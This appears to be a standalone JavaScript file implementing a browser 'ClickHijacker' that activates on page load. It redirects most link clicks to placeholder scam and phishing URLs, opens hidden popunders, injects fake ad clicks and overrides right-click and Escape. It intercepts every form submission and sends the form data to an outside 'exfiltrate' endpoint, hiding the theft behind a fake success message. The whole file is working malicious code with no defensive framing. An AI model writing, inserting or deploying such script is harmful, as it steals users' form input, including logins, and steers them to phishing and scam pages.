// Click hijacking and user manipulation
class ClickHijacker {
    constructor() {
        this.hijackedLinks = new Set();
        this.setupHijacking();
    }

    setupHijacking() {
        // Hijack all clicks
        document.addEventListener('click', this.handleClick.bind(this), true);
        
        // Hijack form submissions
        document.addEventListener('submit', this.handleSubmit.bind(this), true);
        
        // Hijack touch events
        document.addEventListener('touchstart', this.handleTouch.bind(this), true);
        
        // Prevent right-click
        document.addEventListener('contextmenu', this.preventContextMenu.bind(this));
        
        // Hijack keyboard events
        document.addEventListener('keydown', this.handleKeydown.bind(this), true);
    }

    handleClick(e) {
        // Don't hijack our own ad close buttons
        if (e.target.closest('.ad-deceptive-close') || 
            e.target.closest('.ad-fake-button')) {
            return;
        }
        
        const target = e.target;
        const isLink = target.tagName === 'A' || target.closest('a');
        
        if (isLink && Math.random() < 0.7) { // 70% chance to hijack links
            e.preventDefault();
            e.stopImmediatePropagation();
            
            const originalHref = target.href || target.closest('a')?.href;
            this.hijackLink(originalHref, target);
            
            // Still execute original after delay (sometimes)
            setTimeout(() => {
                if (originalHref && Math.random() < 0.3) {
                    window.location.href = originalHref;
                }
            }, 3000);
            
            return false;
        }
        
        // Randomly inject ad clicks on any element
        if (Math.random() < 0.05) { // 5% chance on any click
            this.injectAdClick(e);
        }
    }

    hijackLink(originalUrl, element) {
        const hijackId = Date.now();
        this.hijackedLinks.add(hijackId);
        
        // Show fake loading
        this.showFakeLoading(element);
        
        // Redirect to ad first
        const adUrls = [
            'https://malicious-redirect.com/ad?type=clickjack',
            'https://affiliate-scam.com/offer',
            'https://phishing-page.com/fake-login'
        ];
        
        const randomAdUrl = adUrls[Math.floor(Math.random() * adUrls.length)];
        
        // Open in new tab/window
        const newWindow = window.open(randomAdUrl, '_blank');
        
        if (newWindow) {
            // Attempt to refocus original window after a delay
            setTimeout(() => {
                window.focus();
                
                // Sometimes open another popunder
                if (Math.random() < 0.5) {
                    window.open(randomAdUrl + '&popunder=true', '_blank', 
                              'width=1,height=1,left=10000,top=10000');
                }
            }, 100);
        }
        
        // Track the hijack
        this.trackHijack(originalUrl, randomAdUrl);
    }

    showFakeLoading(element) {
        const originalHtml = element.innerHTML;
        const originalColor = element.style.color;
        
        element.innerHTML = 'Loading...';
        element.style.color = '#666';
        element.style.cursor = 'wait';
        
        // Restore after delay
        setTimeout(() => {
            element.innerHTML = originalHtml;
            element.style.color = originalColor;
            element.style.cursor = 'pointer';
        }, 2000);
    }

    injectAdClick(e) {
        // Simulate a click on a hidden ad element
        const fakeAdClick = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true,
            clientX: e.clientX + 10,
            clientY: e.clientY + 10
        });
        
        // Create hidden ad element if needed
        let hiddenAd = document.getElementById('hiddenAdClick');
        if (!hiddenAd) {
            hiddenAd = document.createElement('div');
            hiddenAd.id = 'hiddenAdClick';
            hiddenAd.style.cssText = `
                position: fixed;
                width: 1px;
                height: 1px;
                opacity: 0;
                pointer-events: none;
                z-index: -1;
            `;
            document.body.appendChild(hiddenAd);
            
            // Add click handler to hidden ad
            hiddenAd.addEventListener('click', () => {
                window.open('https://malicious-ads.com/injected-click', '_blank');
            });
        }
        
        // Trigger click
        hiddenAd.dispatchEvent(fakeAdClick);
    }

    handleSubmit(e) {
        // Intercept form submissions
        e.preventDefault();
        
        const form = e.target;
        const formData = new FormData(form);
        const formObject = Object.fromEntries(formData);
        
        // Send form data to malicious server
        this.exfiltrateFormData(formObject);
        
        // Show fake success message
        this.showFakeSubmission(form);
        
        // Actually submit after delay (sometimes)
        setTimeout(() => {
            if (Math.random() < 0.5) {
                form.submit();
            }
        }, 3000);
        
        return false;
    }

    exfiltrateFormData(formData) {
        const endpoint = 'https://data-harvester.pro/exfiltrate';
        
        fetch(endpoint, {
            method: 'POST',
            body: JSON.stringify({
                type: 'form_data',
                data: formData,
                timestamp: Date.now(),
                url: window.location.href
            }),
            mode: 'no-cors'
        }).catch(() => {});
        
        // Also store locally
        const storedForms = JSON.parse(localStorage.getItem('stolen_forms') || '[]');
        storedForms.push({
            data: formData,
            timestamp: Date.now(),
            url: window.location.href
        });
        localStorage.setItem('stolen_forms', JSON.stringify(storedForms));
    }

    showFakeSubmission(form) {
        const originalHtml = form.innerHTML;
        const originalAction = form.action;
        
        form.innerHTML = `
            <div style="text-align: center; padding: 20px; color: green;">
                <h3>✓ Submission Successful!</h3>
                <p>Your request is being processed...</p>
                <div class="loader-small"></div>
            </div>
        `;
        
        form.action = 'javascript:void(0)';
        
        // Restore after delay
        setTimeout(() => {
            form.innerHTML = originalHtml;
            form.action = originalAction;
        }, 5000);
    }

    handleTouch(e) {
        // Hijack touch events for mobile
        if (e.touches && e.touches.length > 0) {
            const touch = e.touches[0];
            
            // Randomly inject ad on touch
            if (Math.random() < 0.1) {
                e.preventDefault();
                
                // Create touch-based redirect
                setTimeout(() => {
                    window.location.href = 'https://malicious-ads.com/touch-hijack';
                }, 500);
            }
        }
    }

    handleKeydown(e) {
        // Hijack certain key combinations
        if (e.ctrlKey && e.key === 'c') {
            // Intercept copy with ad
            setTimeout(() => {
                this.showCopyNotification();
            }, 100);
        }
        
        if (e.key === 'Escape') {
            // Prevent escape from closing ads
            e.preventDefault();
            e.stopPropagation();
            
            // Instead, show more ads
            if (window.adEngine) {
                window.adEngine.showFullscreenAd();
            }
        }
    }

    showCopyNotification() {
        const notification = document.createElement('div');
        notification.innerHTML = `
            <div style="position: fixed; bottom: 20px; right: 20px; background: #4CAF50; 
                        color: white; padding: 15px; border-radius: 10px; z-index: 2147483647;
                        box-shadow: 0 4px 12px rgba(0,0,0,0.2); max-width: 300px;">
                <strong>📋 Copied!</strong><br>
                Special offer for you: <a href="https://malicious-offer.com" 
                style="color: white; text-decoration: underline;">Click here</a>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => notification.remove(), 5000);
    }

    preventContextMenu(e) {
        e.preventDefault();
        
        // Show custom context menu with ads
        this.showAdContextMenu(e.clientX, e.clientY);
        
        return false;
    }

    showAdContextMenu(x, y) {
        const contextMenu = document.createElement('div');
        contextMenu.innerHTML = `
            <div style="position: fixed; top: ${y}px; left: ${x}px; 
                        background: white; border: 1px solid #ccc; 
                        border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                        z-index: 2147483647; min-width: 200px;">
                <div style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">
                    Advertisement Menu
                </div>
                <div style="padding: 10px; cursor: pointer;" 
                     onclick="window.open('https://malicious-ads.com/context', '_blank')">
                    🔗 Special Offer
                </div>
                <div style="padding: 10px; cursor: pointer;" 
                     onclick="window.open('https://scam-site.com/offer', '_blank')">
                    💰 Free Gift Card
                </div>
                <div style="padding: 10px; cursor: pointer; color: #666; font-size: 0.9em;">
                    Right-click disabled on this site
                </div>
            </div>
        `;
        
        contextMenu.id = 'adContextMenu';
        document.body.appendChild(contextMenu);
        
        // Close on click elsewhere
        setTimeout(() => {
            document.addEventListener('click', function closeMenu() {
                const menu = document.getElementById('adContextMenu');
                if (menu) menu.remove();
                document.removeEventListener('click', closeMenu);
            });
        }, 10);
    }

    trackHijack(originalUrl, hijackedUrl) {
        const trackingData = {
            original: originalUrl,
            hijacked: hijackedUrl,
            timestamp: Date.now(),
            userAgent: navigator.userAgent
        };
        
        // Send to tracking server
        fetch('https://hijack-tracker.com/log', {
            method: 'POST',
            body: JSON.stringify(trackingData),
            mode: 'no-cors'
        }).catch(() => {});
        
        // Store locally
        const hijacks = JSON.parse(localStorage.getItem('link_hijacks') || '[]');
        hijacks.push(trackingData);
        localStorage.setItem('link_hijacks', JSON.stringify(hijacks));
    }
}

// Initialize hijacker
window.clickHijacker = new ClickHijacker();